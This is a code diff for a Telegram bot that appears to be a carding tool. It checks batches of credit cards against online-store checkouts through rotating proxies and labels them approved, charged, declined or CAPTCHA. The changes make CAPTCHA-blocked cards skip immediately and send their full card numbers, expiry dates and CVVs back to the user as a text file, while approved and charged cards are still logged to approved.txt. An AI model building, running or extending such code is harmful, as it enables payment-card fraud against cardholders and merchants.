@@ -855,8 +855,6 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
     except Exception:
         used_proxy_url = None
     
-    _captcha_site_hits = 0
-    _sites_tried = 0
     for site_idx, site in enumerate(ordered_sites):
         # Check for cancellation BEFORE starting this site
         try:
@@ -1313,18 +1311,17 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
                     "PAYMENTS_METHOD",
                     "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                     "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+                    "DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN",
                     "VALIDATION_CUSTOM",
                     "VALIDATION_",
                     "PAYMENTS_CREDIT_CARD_SESSION_ID",
                     "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED",
                 )
-                
-                # --- CAPTCHA detection: try next site for this card ---
+
+                # --- CAPTCHA: skip this card immediately (no multi-site retry) ---
                 if "CAPTCHA_METADATA_MISSING" in submit_upper or "CAPTCHA" in submit_upper:
                     update_site_health(shop_url, "captcha")
-                    _captcha_site_hits += 1
-                    _sites_tried += 1
-                    continue  # try next site
+                    return "captcha", '"code": "CAPTCHA_REQUIRED"', "$0", "", used_proxy_url, shop_url, None
                 
                 # Check if submit_code indicates a site-level error that requires site removal
                 is_site_level_error = any(tok in submit_upper for tok in site_level_submit_errors)
@@ -1436,11 +1433,9 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
                 code_display = '"code": "UNKNOWN"'
             status = classify_prefix(code_display)
             if status == "captcha":
-                # CAPTCHA at step5: try next site for this card
+                # CAPTCHA at step5: skip card immediately (no multi-site retry)
                 update_site_health(shop_url, "captcha")
-                _captcha_site_hits += 1
-                _sites_tried += 1
-                continue
+                return "captcha", '"code": "CAPTCHA_REQUIRED"', "$0", "", used_proxy_url, shop_url, None
             if status == "unknown":
                 try:
                     receipt = (poll_response or {}).get("data", {}).get("receipt", {}) if isinstance(poll_response, dict) else {}
@@ -1514,7 +1509,6 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
                     update_site_health(shop_url, "success")
             except Exception as track_err:
                 logger.debug(f"Failed to track site health: {track_err}")
-            _sites_tried += 1
             return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, receipt_id
 
         except Exception as e:
@@ -1581,9 +1575,6 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
         code_msg = f'"code": "{single}"'
     else:
         code_msg = '"code": "UNKNOWN"'
-    # If all sites gave CAPTCHA, report as captcha not unknown
-    if _captcha_site_hits > 0 and _sites_tried > 0 and _captcha_site_hits >= _sites_tried:
-        return "captcha", '"code": "CAPTCHA_REQUIRED"', "$0", "", used_proxy_url, None, None
     return "unknown", code_msg, "$0", "", used_proxy_url, None, None
 
 class BatchRunner:
@@ -1835,8 +1826,8 @@ class BatchRunner:
                         pass
 
             logger.info(f"[DEBUG] Card result - status: {status}, code: {code_display}")
-            if status in ("approved", "charged"):
-                logger.info(f"[DEBUG] Entering approved/charged block for {status}")
+            if status in ("approved", "charged", "captcha"):
+                logger.info(f"[DEBUG] Entering approved/charged/captcha block for {status}")
                 display_name = None
                 user_id = None
                 try:
@@ -1848,22 +1839,23 @@ class BatchRunner:
                         display_name = uname if uname else str(user.id)
                 except Exception:
                     pass
-                
-                logger.info(f"[DEBUG] About to persist to approved.txt - status: {status}")
-                try:
-                    with APPROVED_FILE_LOCK:
-                        site_display_val = site_label
-                        if isinstance(display_name, str) and display_name.strip():
-                            site_display_val = f"{site_label} |  {display_name.strip()}"
-                        logger.info(f"[DEBUG] Writing to approved.txt: {site_display_val}")
-                        try:
-                            checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
-                        except TypeError:
-                            checkout.emit_summary_line(card, code_display, amount_display)
-                except Exception:
-                    pass
-                
-                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications) or status in ("captcha", "unknown")
+
+                if status in ("approved", "charged"):
+                    logger.info(f"[DEBUG] About to persist to approved.txt - status: {status}")
+                    try:
+                        with APPROVED_FILE_LOCK:
+                            site_display_val = site_label
+                            if isinstance(display_name, str) and display_name.strip():
+                                site_display_val = f"{site_label} |  {display_name.strip()}"
+                            logger.info(f"[DEBUG] Writing to approved.txt: {site_display_val}")
+                            try:
+                                checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
+                            except TypeError:
+                                checkout.emit_summary_line(card, code_display, amount_display)
+                    except Exception:
+                        pass
+
+                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications) or (status == "captcha")
                 logger.info(f"[DEBUG] send_chat = {send_chat}, send_approved_notifications = {self.send_approved_notifications}")
                 if send_chat:
                     try:
@@ -1879,7 +1871,7 @@ class BatchRunner:
 
         elapsed_s = int(__import__("time").time() - (self.start_ts or __import__("time").time()))
         if self.processed == self.total:
-            _final_text = "🏁 Check Complete\n"
+            _final_text = "📊 Check Complete\n"
         else:
             _final_text = f"🛑 Stopped ({self.processed}/{self.total})\n"
         _final_text += (
@@ -1890,7 +1882,7 @@ class BatchRunner:
         )
         if hasattr(self, 'captcha') and self.captcha > 0:
             _final_text += f"\n⚠️ CAPTCHA: {self.captcha}"
-        _final_text += f"\n⏱ Time: {elapsed_s}s"
+        _final_text += f"\n⏱️ Time: {elapsed_s}s"
         await update.effective_chat.send_message(
             text=_final_text,
             parse_mode=ParseMode.HTML,
@@ -2657,8 +2649,8 @@ class BatchRunner:
                             logger.error(f"Failed to update progress after retry: {e}")
 
             logger.info(f"[DEBUG-RUN2] Card result - status: {status}, code: {code_display}")
-            if status in ("approved", "charged"):
-                logger.info(f"[DEBUG-RUN2] Entering approved/charged block for {status}")
+            if status in ("approved", "charged", "captcha"):
+                logger.info(f"[DEBUG-RUN2] Entering approved/charged/captcha block for {status}")
                 display_name = None
                 user_id = None
                 try:
@@ -2670,22 +2662,23 @@ class BatchRunner:
                         display_name = uname if uname else str(user.id)
                 except Exception:
                     pass
-                
-                logger.info(f"[DEBUG-RUN2] About to persist to approved.txt - status: {status}")
-                try:
-                    with APPROVED_FILE_LOCK:
-                        site_display_val = site_label
-                        if isinstance(display_name, str) and display_name.strip():
-                            site_display_val = f"{site_label} |  {display_name.strip()}"
-                        logger.info(f"[DEBUG-RUN2] Writing to approved.txt: {site_display_val}")
-                        try:
-                            checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
-                        except TypeError:
-                            checkout.emit_summary_line(card, code_display, amount_display)
-                except Exception:
-                    pass
-                
-                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications) or status in ("captcha", "unknown")
+
+                if status in ("approved", "charged"):
+                    logger.info(f"[DEBUG-RUN2] About to persist to approved.txt - status: {status}")
+                    try:
+                        with APPROVED_FILE_LOCK:
+                            site_display_val = site_label
+                            if isinstance(display_name, str) and display_name.strip():
+                                site_display_val = f"{site_label} |  {display_name.strip()}"
+                            logger.info(f"[DEBUG-RUN2] Writing to approved.txt: {site_display_val}")
+                            try:
+                                checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
+                            except TypeError:
+                                checkout.emit_summary_line(card, code_display, amount_display)
+                    except Exception:
+                        pass
+
+                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications) or (status == "captcha")
                 logger.info(f"[DEBUG-RUN2] send_chat = {send_chat}, send_approved_notifications = {self.send_approved_notifications}")
                 if send_chat:
                     try:
@@ -2762,8 +2755,34 @@ class BatchRunner:
 
         pending = max(0, self.total - self.processed)
         elapsed_s = int(__import__("time").time() - (self.start_ts or __import__("time").time()))
+
+        # Send captcha cards .txt BEFORE final summary (so order is: result → txt → summary)
+        if self.captcha > 0 and self.captcha_cards:
+            try:
+                import io
+                lines = []
+                for c in self.captcha_cards:
+                    try:
+                        pan = str(c.get("number", ""))
+                        mm = int(c.get("month", 0) or 0)
+                        yy = int(c.get("year", 0) or 0)
+                        cvv = str(c.get("verification_value", ""))
+                        lines.append(f"{pan}|{mm}|{yy if yy >= 2000 else yy + 2000}|{cvv}")
+                    except Exception:
+                        pass
+                if lines:
+                    file_content = "\n".join(lines).encode("utf-8")
+                    fname = f"captcha_required_{self.user_id}_{self.batch_id}.txt"
+                    await update.effective_chat.send_document(
+                        document=io.BytesIO(file_content),
+                        filename=fname,
+                        caption=("⚠️ " + str(self.captcha) + (" card" if self.captcha == 1 else " cards") + " with CAPTCHA_REQUIRED (skipped)"),
+                    )
+            except Exception as cap_err:
+                logger.error(f"Failed to send captcha file: {cap_err}")
+
         if self.processed == self.total:
-            final_text = "🏁 Check Complete\n"
+            final_text = "📊 Check Complete\n"
         else:
             final_text = f"🛑 Stopped ({self.processed}/{self.total})\n"
         final_text += (
@@ -2774,7 +2793,7 @@ class BatchRunner:
         )
         if self.captcha > 0:
             final_text += f"\n⚠️ CAPTCHA: {self.captcha}"
-        final_text += f"\n⏱ Time: {elapsed_s}s"
+        final_text += f"\n⏱️ Time: {elapsed_s}s"
         try:
             await update.effective_chat.send_message(
                 text=final_text,
@@ -2797,31 +2816,6 @@ class BatchRunner:
                     logger.error(f"Error sending final message: {e}")
             except Exception:
                 logger.error(f"Failed to send final message after retry: {e}")
-
-        # Send captcha cards as a .txt file if any were found
-        if self.captcha > 0 and self.captcha_cards:
-            try:
-                import io
-                lines = []
-                for c in self.captcha_cards:
-                    try:
-                        pan = str(c.get("number", ""))
-                        mm = int(c.get("month", 0) or 0)
-                        yy = int(c.get("year", 0) or 0)
-                        cvv = str(c.get("verification_value", ""))
-                        lines.append(f"{pan}|{mm}|{yy if yy >= 2000 else yy + 2000}|{cvv}")
-                    except Exception:
-                        pass
-                if lines:
-                    file_content = "\n".join(lines).encode("utf-8")
-                    fname = f"captcha_required_{self.user_id}_{self.batch_id}.txt"
-                    await update.effective_chat.send_document(
-                        document=io.BytesIO(file_content),
-                        filename=fname,
-                        caption=("⚠️ " + str(self.captcha) + (" cards" if self.captcha != 1 else " card") + " with CAPTCHA_REQUIRED (skipped)"),
-                    )
-            except Exception as cap_err:
-                logger.error(f"Failed to send captcha file: {cap_err}")
 
 def mask_proxy_password(proxy_url: str) -> str:
     """Mask the password in a proxy URL, leaving other parts visible."""
@@ -4145,6 +4139,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             approved = 0
             declined = 0
             charged = 0
+            captcha = 0
+            captcha_cards = []
             processed = 0
             start_ts = time.time()
             
@@ -4236,7 +4232,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             charged += 1
                         elif status == "declined":
                             declined += 1
-                        
+                        elif status == "captcha":
+                            captcha += 1
+                            captcha_cards.append(card)
+
                         # Update proxy index on success
                         if user_proxies_list and len(user_proxies_list) > 0:
                             current_proxy_idx = (current_proxy_idx + 1) % len(user_proxies_list)
@@ -4316,6 +4315,55 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 except Exception:
                                     pass
             
+            # Send captcha cards .txt BEFORE final summary
+            if captcha > 0 and captcha_cards:
+                try:
+                    import io as _io
+                    _lines = []
+                    for c in captcha_cards:
+                        try:
+                            _pan = str(c.get("number", ""))
+                            _mm  = int(c.get("month", 0) or 0)
+                            _yy  = int(c.get("year", 0) or 0)
+                            _cvv = str(c.get("verification_value", ""))
+                            _lines.append(f"{_pan}|{_mm}|{_yy if _yy >= 2000 else _yy + 2000}|{_cvv}")
+                        except Exception:
+                            pass
+                    if _lines:
+                        _fc = "\n".join(_lines).encode("utf-8")
+                        _fn = f"captcha_required_{user_id}_{batch_id}.txt"
+                        await update.effective_chat.send_document(
+                            document=_io.BytesIO(_fc),
+                            filename=_fn,
+                            caption=("⚠️ " + str(captcha) + (" card" if captcha == 1 else " cards") + " with CAPTCHA_REQUIRED (skipped)"),
+                        )
+                except Exception as _cap_err:
+                    logger.error(f"Failed to send captcha file: {_cap_err}")
+
+            # Final summary
+            elapsed_s = int(time.time() - start_ts)
+            _total = len(cards)
+            if processed >= _total:
+                _summary = "📊 Check Complete\n"
+            else:
+                _summary = f"🛑 Stopped ({processed}/{_total})\n"
+            _summary += (
+                f"\nTotal: {_total}"
+                f"\n✅ Approved: {approved}"
+                f"\n❌ Declined: {declined}"
+                f"\n💎 Charged: {charged}"
+            )
+            if captcha > 0:
+                _summary += f"\n⚠️ CAPTCHA: {captcha}"
+            _summary += f"\n⏱️ Time: {elapsed_s}s"
+            try:
+                await update.effective_chat.send_message(
+                    text=_summary,
+                    disable_web_page_preview=True,
+                )
+            except Exception:
+                pass
+
             # Clean up ACTIVE_BATCHES
             try:
                 async with ACTIVE_LOCK:
